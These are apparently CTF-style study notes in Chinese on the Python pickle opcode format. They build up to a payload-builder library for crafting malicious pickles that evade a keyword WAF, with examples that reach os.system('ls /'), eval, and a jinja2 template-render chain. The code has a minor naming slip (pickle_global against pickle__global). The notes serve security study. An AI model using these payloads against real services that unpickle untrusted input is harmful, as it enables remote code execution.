# 参考
	- [pickletools源码](https://github.com/python/cpython/blob/3.12/Lib/pickletools.py)
- # 结构
	- 版本2之上的结构：
	  id:: 65af7519-c764-4191-aa91-34ec4956cda5
		- PROTO+(FRAME+opcode)*n+b"."
		- PROTO
			- 当前pickle opcode的版本号
			- 结构：0x80加上1B的版本号，如版本4`b"\x80\x04"`
		- FRAME:
			- 当前帧的长度
			- `b"\x95"`加上8B的小端序长度
		- 实际上PROTO和FRAME可以省略，变成`opcode+b"."`
- # 读取过程
	- [[draws/2024-01-23-16-17-55.excalidraw]]
	  id:: 65af7631-5baf-4ad0-a6b9-9584c58713eb
- # 构造字符串
	- opcode效果：在当前的栈顶放入一个字符串
	- 字符串opcode可以分为两类
		- 字符长度+实际的字符: 记录字符串的长度和所有字符，从而表示字符串
		- 实际的字符+`\n`: 使用`\n`标记结尾，从而表示整个字符串
	- string: 使用`\n`表示结尾
		- ```python
		  opcode=b'''S'__main__'\n.'''
		  pickletools.dis(opcode)
		  print(waf(opcode))
		  pickle.loads(opcode)
		  ```
		- 支持转义
			- ```python
			  opcode=b'''S'__m\\x61in__'\n.'''
			  pickletools.dis(opcode)
			  print(waf(opcode))
			  pickle.loads(opcode)
			  ```
	- BINSTRING
		- ```python
		  opcode=b'''T\x08\x00\x00\x00__main__.'''
		  pickletools.dis(opcode)
		  print(waf(opcode))
		  pickle.loads(opcode)
		  ```
	- SHORT_BINSTRING
		- ```python
		  opcode=b'''U\x08__main__.'''
		  pickletools.dis(opcode)
		  print(waf(opcode))
		  pickle.loads(opcode)
		  ```
	- unicode
		- ```python
		  opcode = b"Vecho \u4f60\u597d\u4e16\u754c\n."
		  pickletools.dis(opcode)
		  print(waf(opcode))
		  pickle.loads(opcode)
		  ```
- # 取全局属性
	- GLOBAL: 根据名字取对应属性
	- STACK_GLOBAL: 根据栈上的值取对应属性
		- ```python
		  def add_pickle_header(opcodes: bytes):
		      return b"\x80\x04\x95" + len(opcodes).to_bytes(8, "little") + opcodes
		  
		  
		  def pickle_string(pickle_type, value):
		      if pickle_type == "BINSTRING":
		          return b"T" + len(value).to_bytes(4, "little") + value.encode()
		  
		  # pickle.loads
		  opcode = (
		      pickle_string("BINSTRING", "pickle")
		      + pickle_string("BINSTRING", "loads")
		      + b"\x93"
		      + b"."
		  )
		  opcode = add_pickle_header(opcode)
		  pickletools.dis(opcode)
		  print(waf(opcode))
		  print(pickle.loads(opcode))
		  ```
- # 构造tuple
	- `b"(" + opcode + b"t"`
		- `(`: 在栈上放一个标记
		- opcode: 在栈上构造tuple的元素
		- `t`: 将标记之上的所有元素都放入元组中
		- [[draws/2024-01-23-17-50-53.excalidraw]]
- # 函数调用/构造对象
	- REDUCE: 调用函数
		- `b"R"`，作用是从当前的栈上拿出函数和参数的元组，调用函数并把结果放在栈顶
		- ```python
		  class A:
		      def __reduce__(self):
		        	#也就是构造这个函数和下面这个tuple
		          return [eval, ("1+1", )]
		  ```
	- BUILD: 修改栈上对象的属性
		- 从当前的栈上拿出对象和一个字典，把字典中的数据放入对象中，并将对象放回栈顶
	- INST: 根据名字查找模块和函数并调用，从而创建对象
		- pickletools提到其支持创建对象，实测支持任意函数调用
	- OBJ: 调用栈上的函数
		- [[draws/2024-01-23-19-22-09.excalidraw]]
	- NEWOBJ: 根据栈上的类产生新的对象
	- NEWOBJ_EX: 和NEWOBJ功能相同，但是支持dict传参
	- 具体构造方法看下方的payload构造函数
- # payload构造函数
	- ```python
	  # https://github.com/python/cpython/blob/3.12/Lib/pickletools.py#L1420
	  
	  import typing as t
	  
	  PickleOpcode = t.NewType("PickleOpcode", bytes)
	  
	  
	  def add_pickle_header(opcodes: PickleOpcode) -> PickleOpcode:
	      return b"\x80\x04\x95" + len(opcodes).to_bytes(8, "little") + opcodes
	  
	  
	  def pickle_string(pickle_type, value: str) -> PickleOpcode:
	      if pickle_type == "STRING":
	          return b"S" + value.encode() + b"\n"
	      if pickle_type == "SHORT_BINSTRING":
	          return b"U" + len(value).to_bytes(1, "little") + value.encode()
	      if pickle_type == "BINSTRING":
	          return b"T" + len(value).to_bytes(4, "little") + value.encode()
	      if pickle_type == "UNICODE":
	          return b"V" + value.encode() + b"\n"
	      if pickle_type == "SHORT_BINUNICODE":
	          return b"\x8c" + len(value).to_bytes(1, "little") + value.encode()
	      if pickle_type == "BINUNICODE":
	          return b"X" + len(value).to_bytes(4, "little") + value.encode()
	      else:
	          raise NotImplementedError(f"{pickle_type=} is not supported.")
	  
	  
	  def pickle_bytes(pickle_type, value: bytes) -> PickleOpcode:
	      if pickle_type == "SHORT_BINBYTES":
	          return b"C" + len(value).to_bytes(1, "little") + value
	      if pickle_type == "BINBYTES":
	          return b"B" + len(value).to_bytes(4, "little") + value
	      if pickle_type == "BINBYTES8":
	          return b"\x8e" + len(value).to_bytes(8, "little") + value
	      else:
	          raise NotImplementedError(f"{pickle_type=} is not supported.")
	  
	  
	  def pickle_tuple(pickle_type, values: t.Iterable[PickleOpcode]) -> PickleOpcode:
	      if pickle_type == "TUPLE":
	          return b"(" + b"".join(values) + b"t"
	      else:
	          raise NotImplementedError(f"{pickle_type=} is not supported.")
	  
	  
	  def pickle__global(module: str, clazz: str) -> PickleOpcode:
	      return b"c" + module.encode() + b"\n" + clazz.encode() + b"\n"
	  
	  
	  def pickle_stack_global(module: PickleOpcode, attr: PickleOpcode) -> PickleOpcode:
	      return module + attr + b"\x93"
	  
	  
	  def pickle_inst(
	      arguments: t.Iterable[PickleOpcode], module: str, clazz: str
	  ) -> PickleOpcode:
	      """构造对象，如：
	  
	      pickle_inst([pickle_string("BINSTRING", "here")], "__main__", "backdoor") + b"."
	      """
	      return (
	          b"("
	          + b"".join(arguments)
	          + b"i"
	          + module.encode()
	          + b"\n"
	          + clazz.encode()
	          + b"\n"
	      )
	  
	  
	  def pickle_obj(
	      clazz: PickleOpcode, arguments: t.Iterable[PickleOpcode]
	  ) -> PickleOpcode:
	      """构造对象，如：
	  
	      pickle_obj(
	          pickle_stack_global(
	              pickle_string("BINSTRING", "__main__"), pickle_string("BINSTRING", "A")
	          ),
	          [],
	      )
	  
	      也可以用于调用函数
	      """
	      return b"(" + clazz + b"".join(arguments) + b"o"
	  
	  
	  def pickle_newobj(clazz: PickleOpcode, tpl: PickleOpcode) -> PickleOpcode:
	      """构造对象，其中clazz只能是一个类，不能是一个函数。这一点和OBJ不同"""
	      return clazz + tpl + b"\x81"
	  
	  
	  def pickle_newobjex(
	      clazz: PickleOpcode, args: PickleOpcode, kwargs: PickleOpcode
	  ) -> PickleOpcode:
	      """构造对象，输入args是一个tuple，kwargs是一个字典
	      其中clazz只能是一个类，不能是一个函数。这一点和OBJ不同"""
	      return clazz + args + kwargs + b"\x92"
	  
	  
	  def pickle_reduce(func: PickleOpcode, tpl: PickleOpcode) -> PickleOpcode:
	      return func + tpl + b"R"
	  
	  
	  # import os
	  # tpl = ("echo executed")
	  # os.syste,(*tpl)
	  opcode = (
	      pickle_inst([pickle_string("BINSTRING", "ls /")], "os", "system") + b"."
	  )
	  opcode += b"."
	  opcode = add_pickle_header(opcode) # 可加可不加
	  # pickletools.dis(opcode)
	  # print(waf(opcode))
	  # print(pickle.loads(opcode))
	  ```
	- 使用例
		- `jinja2.Template(xxx).render()`
			- 然后就可以用焚靖绕WAF了
			- ```python
			  template_opcode = pickle_obj(
			      pickle_global("jinja2", "Template"), [pickle_string("BINSTRING", "{{1+1}}")]
			  )
			  renderfunc_opcode = pickle_obj(
			      pickle_global("builtins", "getattr"),
			      [
			          template_opcode,
			          pickle_string("BINSTRING", "render"),
			      ],
			  )
			  opcode = pickle_obj(renderfunc_opcode, [])
			  opcode += b"."
			  opcode = add_pickle_header(opcode)
			  # pickletools.dis(opcode)
			  # print(waf(opcode))
			  print(opcode)
			  print(pickle.loads(opcode))
			  ```